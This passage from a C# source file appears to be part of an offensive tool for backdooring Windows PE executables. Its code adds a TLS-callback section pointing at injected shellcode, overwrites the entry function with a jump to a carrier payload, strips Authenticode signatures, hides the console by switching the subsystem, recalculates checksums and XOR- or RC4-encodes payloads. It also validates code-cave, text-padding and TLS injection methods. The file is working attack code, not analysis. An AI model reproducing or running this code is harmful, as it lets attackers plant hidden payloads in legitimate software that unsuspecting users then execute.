        uint rawOffset = AlignUp(lastSect.RawAddress + lastSect.RawSize, fileAlign);

        // Extend file
        int newFileSize = Math.Max(peData.Length, (int)(rawOffset + rawSize));
        var output = new byte[newFileSize];
        Array.Copy(peData, 0, output, 0, peData.Length);

        // RVAs for the structures
        uint tlsDirRva = newRva;
        uint callbackArrayRva = newRva + TLS_DIR_SIZE;
        uint payloadRva = newRva + (uint)headerArea;
        ulong payloadVa = pe.ImageBase + payloadRva;
        ulong callbackArrayVa = pe.ImageBase + callbackArrayRva;

        // ── Step 2: Write the IMAGE_TLS_DIRECTORY64
        using (var ms = new MemoryStream(output))
        {
            ms.Seek(rawOffset, SeekOrigin.Begin);
            using var bw = new BinaryWriter(ms);

            bw.Write((ulong)0);           // StartAddressOfRawData
            bw.Write((ulong)0);           // EndAddressOfRawData
            bw.Write((ulong)0);           // AddressOfIndex
            bw.Write(callbackArrayVa);    // AddressOfCallBacks (VA of callback array)
            bw.Write((uint)0);            // SizeOfZeroFill
            bw.Write((uint)0);            // Characteristics
        }

        // ── Step 3: Write the callback array [payload_va, 0]
        BitConverter.GetBytes(payloadVa).CopyTo(output, rawOffset + TLS_DIR_SIZE);
        BitConverter.GetBytes((ulong)0).CopyTo(output, rawOffset + TLS_DIR_SIZE + 8);

        // ── Step 4: Write the payload
        Array.Copy(payload, 0, output, rawOffset + headerArea, payload.Length);

        // ── Step 5: Update NumberOfSections
        ushort newCount = (ushort)(pe.NumberOfSections + 1);
        BitConverter.GetBytes(newCount).CopyTo(output, pe.NumberOfSectionsFileOffset);

        // ── Step 6: Update SizeOfImage
        uint newSizeOfImage = AlignUp(newRva + (uint)totalSize, sectAlign);
        BitConverter.GetBytes(newSizeOfImage).CopyTo(output, pe.SizeOfImageFieldFileOffset);

        // ── Step 7: Write the new section header
        string tlsSectionName = sectionName.Length <= 8 ? sectionName : sectionName[..8];
        using (var ms = new MemoryStream(output))
        {
            ms.Seek(newHeaderOffset, SeekOrigin.Begin);
            using var bw = new BinaryWriter(ms);

            var nameBytes = new byte[8];
            Encoding.ASCII.GetBytes(tlsSectionName, 0, Math.Min(tlsSectionName.Length, 8), nameBytes, 0);
            bw.Write(nameBytes);
            bw.Write((uint)totalSize);       // VirtualSize
            bw.Write(newRva);                // VirtualAddress
            bw.Write(rawSize);               // SizeOfRawData
            bw.Write(rawOffset);             // PointerToRawData
            bw.Write(0u);                    // PointerToRelocations
            bw.Write(0u);                    // PointerToLinenumbers
            bw.Write((ushort)0);             // NumberOfRelocations
            bw.Write((ushort)0);             // NumberOfLinenumbers
            bw.Write(IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE);
        }

        // ── Step 8: Patch the TLS data directory (index 9) to point to our TLS directory
        //   PE32+: data dirs start at optHeader + 112; TLS = index 9 → offset + 112 + 9*8 = optHeader + 184
        long optHeaderOffset = pe.PeOffset + 4 + 20; // skip signature + file header
        long tlsDataDirOffset = optHeaderOffset + (pe.Is64Bit ? 184 : 168);
        BitConverter.GetBytes(tlsDirRva).CopyTo(output, tlsDataDirOffset);
        BitConverter.GetBytes((uint)TLS_DIR_SIZE).CopyTo(output, tlsDataDirOffset + 4);

        result.Steps.Add($"Added TLS section '{tlsSectionName}' at RVA 0x{newRva:X} (raw 0x{rawOffset:X})");
        result.Steps.Add($"TLS callback → payload at VA 0x{payloadVa:X} (RVA 0x{payloadRva:X})");
        return (output, payloadRva);
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Header Patching Helpers
    // ═════════════════════════════════════════════════════════════════════

    private byte[] PatchEntryPointField(byte[] peData, ParsedPe pe, uint newEntryPoint)
    {
        var output = peData.ToArray();
        BitConverter.GetBytes(newEntryPoint).CopyTo(output, pe.EntryPointFieldFileOffset);
        return output;
    }

    /// <summary>
    /// Patches the first 5 bytes of the entry function with a near JMP to the carrier payload.
    /// The PE header's AddressOfEntryPoint is left unchanged — the carrier is reached via the
    /// function body hook, not by a header field change.
    /// </summary>
    private byte[] PatchEntryFunctionWithJmp(byte[] peData, ParsedPe pe, uint carrierRva, BackdoorResult result)
    {
        var output = peData.ToArray();
        long entryFileOffset = pe.EntryPointCodeFileOffset;

        // JMP rel32 displacement is relative to the next instruction (OEP + 5)
        int jmpRel = (int)carrierRva - (int)(pe.AddressOfEntryPoint + 5);

        output[entryFileOffset] = 0xE9; // JMP rel32
        BitConverter.GetBytes(jmpRel).CopyTo(output, entryFileOffset + 1);

        result.Steps.Add($"Entry function patched at file offset 0x{entryFileOffset:X}: first 5 bytes → JMP carrier 0x{carrierRva:X}");
        _logger.Info($"Entry function code patched: JMP 0x{carrierRva:X} at file offset 0x{entryFileOffset:X}");
        return output;
    }

    private byte[] PatchSectionCharacteristics(byte[] peData, SectionEntry section, uint newChars)
    {
        var output = peData.ToArray();
        // Characteristics is at section header + 36
        BitConverter.GetBytes(newChars).CopyTo(output, section.HeaderFileOffset + 36);
        return output;
    }

    private byte[] RemoveSignatureInternal(byte[] peData, ParsedPe pe)
    {
        var output = peData.ToArray();
        // Zero out Security data directory entry (RVA and Size)
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset);
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset + 4);
        return output;
    }

    /// <summary>
    /// Strip the Authenticode signature overlay data from the end of the file.
    /// The security data directory uses a raw file offset (not RVA),
    /// and the signature bytes sit after the last section.
    /// Truncating them avoids overlap with new-section / section-ext injection.
    /// </summary>
    private byte[] StripSignatureOverlay(byte[] peData, ParsedPe pe)
    {
        // Find where sections end (max of RawAddress + RawSize across all sections)
        uint lastSectionEnd = 0;
        foreach (var s in pe.Sections)
        {
            uint end = s.RawAddress + s.RawSize;
            if (end > lastSectionEnd) lastSectionEnd = end;
        }

        // Truncate file to end of last section (removes overlay/signature bytes)
        if (lastSectionEnd > 0 && lastSectionEnd < peData.Length)
        {
            var truncated = new byte[lastSectionEnd];
            Array.Copy(peData, 0, truncated, 0, (int)lastSectionEnd);

            // Zero the security directory entry in the truncated data
            BitConverter.GetBytes(0u).CopyTo(truncated, pe.SecurityDirFileOffset);
            BitConverter.GetBytes(0u).CopyTo(truncated, pe.SecurityDirFileOffset + 4);

            _logger.Info($"Stripped {peData.Length - lastSectionEnd} bytes of signature overlay");
            return truncated;
        }

        // No overlay to strip — just zero the directory entry
        var output = peData.ToArray();
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset);
        BitConverter.GetBytes(0u).CopyTo(output, pe.SecurityDirFileOffset + 4);
        return output;
    }

    private byte[] PatchSubsystemInternal(byte[] peData, ParsedPe pe)
    {
        var output = peData.ToArray();
        BitConverter.GetBytes(IMAGE_SUBSYSTEM_WINDOWS_GUI).CopyTo(output, pe.SubsystemFieldFileOffset);
        return output;
    }

    private byte[] RecalculateChecksum(byte[] peData, ParsedPe pe)
    {
        var output = peData.ToArray();

        // Zero out the current checksum
        BitConverter.GetBytes(0u).CopyTo(output, pe.ChecksumFieldFileOffset);

        // Calculate PE checksum (standard CheckSumMappedFile algorithm)
        long checksum = 0;
        int checksumOffset = (int)pe.ChecksumFieldFileOffset;

        for (int i = 0; i < output.Length; i += 2)
        {
            // Skip the checksum field itself
            if (i == checksumOffset || i == checksumOffset + 2)
                continue;

            ushort word;
            if (i + 1 < output.Length)
                word = BitConverter.ToUInt16(output, i);
            else
                word = output[i]; // Last byte if odd-length file

            checksum += word;
            // Fold carries
            checksum = (checksum & 0xFFFF) + (checksum >> 16);
        }

        // Final fold
        checksum = (checksum & 0xFFFF) + (checksum >> 16);
        checksum += output.Length;

        BitConverter.GetBytes((uint)checksum).CopyTo(output, pe.ChecksumFieldFileOffset);
        return output;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Encryption
    // ═════════════════════════════════════════════════════════════════════

    private byte[] EncryptPayload(byte[] data, PeBackdoorOptions options)
    {
        return options.Encryption switch
        {
            PayloadEncryption.Xor => XorEncrypt(data, options.XorKey),
            PayloadEncryption.Xor2 => Xor2Encrypt(data),
            PayloadEncryption.Rc4 => Rc4Encrypt(data, GenerateRc4Key()),
            _ => data
        };
    }

    private static byte[] XorEncrypt(byte[] data, byte key)
    {
        if (key == 0) key = 0x42; // Avoid null key
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key);
        return result;
    }

    private static byte[] Xor2Encrypt(byte[] data)
    {
        var key = new byte[] { 0x42, 0x37 };
        var result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
            result[i] = (byte)(data[i] ^ key[i % 2]);
        return result;
    }

    private static byte[] GenerateRc4Key()
    {
        var key = new byte[16];
        Random.Shared.NextBytes(key);
        return key;
    }

    private static byte[] Rc4Encrypt(byte[] data, byte[] key)
    {
        var s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + s[i] + key[i % key.Length]) & 255;
            (s[i], s[j]) = (s[j], s[i]);
        }

        var result = new byte[data.Length];
        int x = 0, y = 0;
        for (int i = 0; i < data.Length; i++)
        {
            x = (x + 1) & 255;
            y = (y + s[x]) & 255;
            (s[x], s[y]) = (s[y], s[x]);
            result[i] = (byte)(data[i] ^ s[(s[x] + s[y]) & 255]);
        }

        return result;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Validation
    // ═════════════════════════════════════════════════════════════════════

    private List<string> ValidateForInjection(ParsedPe pe, byte[] shellcode, PeBackdoorOptions options)
    {
        var issues = new List<string>();

        if (options.Encryption != PayloadEncryption.None)
            issues.Add("BLOCK: Backdoor-stage encryption/encoding is not supported. Prepare a compatible flat .bin externally, then inject it with encryption set to None.");

        // Carrier-specific validation
        switch (options.CarrierInvoke)
        {
            case CarrierInvoke.EntryFunctionBackdoor:
                if (!pe.Is64Bit)
                    issues.Add("BLOCK: Entry Function Backdoor carrier requires an x64 target PE.");
                break;
            case CarrierInvoke.TlsCallback:
                if (!pe.Is64Bit)
                    issues.Add("BLOCK: TLS Callback carrier requires an x64 target PE.");
                break;
            case CarrierInvoke.DllMain:
                if (!pe.IsDll)
                    issues.Add("BLOCK: DllMain Hook carrier is only applicable to DLL targets. Use Entry Point Hijack for EXE files.");
                break;
        }

        // PreserveOriginalEntry=false is not supported (except for TLS where it is N/A)
        if (!options.PreserveOriginalEntry && options.CarrierInvoke != CarrierInvoke.TlsCallback)
            issues.Add("BLOCK: Disabling original entry-point preservation is not implemented. The current carrier always resumes the original entry point.");

        if (pe.IsDotNet)
            issues.Add("BLOCK: Target is a .NET assembly — binary injection will corrupt managed metadata");

        if (pe.AddressOfEntryPoint == 0)
            issues.Add("BLOCK: PE has no entry point (AddressOfEntryPoint = 0)");

        if (pe.NumberOfSections == 0)
            issues.Add("BLOCK: PE has no sections");

        if (pe.EntryPointCodeFileOffset <= 0 || pe.EntryPointCodeFileOffset >= int.MaxValue)
            issues.Add("BLOCK: Entry point does not map to a valid file offset");

        if (pe.HasSignature && !options.RemoveSignature)
            issues.Add("PE has a digital signature — it will become invalid after injection (use --remove-signature or it will be removed by default)");

        if (pe.IsDll && options.CarrierInvoke == CarrierInvoke.EntryPointHijack)
            issues.Add("Target is a DLL — entry point hijack modifies DllMain behavior");

        if (shellcode.Length > 1_000_000)
            issues.Add("Shellcode is very large (>1MB) — this may cause issues with code cave injection");

        if (options.Method == InjectionMethod.CodeCave)
        {
            // Quick check if any section has enough space
            bool hasCaves = pe.Sections.Any(s =>
                s.RawSize > 0 && s.RawSize >= (uint)shellcode.Length + 100);
            if (!hasCaves)
                issues.Add("No section appears large enough for code cave injection — consider --method new-section");
        }

        if (options.Method == InjectionMethod.TextSectionPadding)
        {
            var textSection = pe.Sections.FirstOrDefault(s =>
                s.Name.Equals(".text", StringComparison.OrdinalIgnoreCase))
                ?? pe.Sections.FirstOrDefault(s => s.IsExecutable);
            if (textSection == null)
                issues.Add("BLOCK: No .text or executable section found for text-padding injection");
            else
            {
                uint gap = textSection.RawSize > textSection.VirtualSize
                    ? textSection.RawSize - textSection.VirtualSize : 0;
                if (gap < (uint)shellcode.Length + 100)
                    issues.Add($"Text section padding may be too small ({gap} bytes) for {shellcode.Length + 100} byte payload — consider --method new-section");
            }
        }

        if (options.Method == InjectionMethod.TlsCallback)
        {
            if (!pe.Is64Bit)
                issues.Add("BLOCK: TLS callback injection is only supported for x64 PE files");
        }

        return issues;
    }

    // ═════════════════════════════════════════════════════════════════════
    //  Utility
    // ═════════════════════════════════════════════════════════════════════

    private static long RvaToFileOffset(uint rva, List<SectionEntry> sections)
    {
        foreach (var s in sections)
        {
            if (rva >= s.VirtualAddress && rva < s.VirtualAddress + Math.Max(s.VirtualSize, s.RawSize))
                return s.RawAddress + (rva - s.VirtualAddress);
        }
        // If RVA is in headers (before first section)
        if (sections.Count > 0 && rva < sections[0].VirtualAddress)
            return rva;
        return -1;
    }

    private static uint FileOffsetToRva(long fileOffset, List<SectionEntry> sections)
    {
        foreach (var s in sections)
        {
            if (fileOffset >= s.RawAddress && fileOffset < s.RawAddress + s.RawSize)
                return s.VirtualAddress + (uint)(fileOffset - s.RawAddress);
        }
        return 0;
    }

    private static uint AlignUp(uint value, uint alignment)
    {
        if (alignment == 0) return value;
        return (value + alignment - 1) & ~(alignment - 1);
    }

    private PeInfo ToPeInfo(ParsedPe pe, string filePath, long fileSize)
    {
        var info = new PeInfo
        {
            FilePath = filePath,
            FileSize = fileSize,
            Is64Bit = pe.Is64Bit,
            IsDll = pe.IsDll,
            IsDotNet = pe.IsDotNet,
            HasAslr = pe.HasAslr,
            HasSignature = pe.HasSignature,
            EntryPoint = pe.AddressOfEntryPoint,
            ImageBase = pe.ImageBase,
        };

        foreach (var s in pe.Sections)
        {
            info.Sections.Add(new PeSectionInfo
            {
                Name = s.Name,
                VirtualAddress = s.VirtualAddress,
                VirtualSize = s.VirtualSize,
                RawAddress = s.RawAddress,
                RawSize = s.RawSize,
                Characteristics = s.Characteristics,
            });
        }

        return info;
    }
}
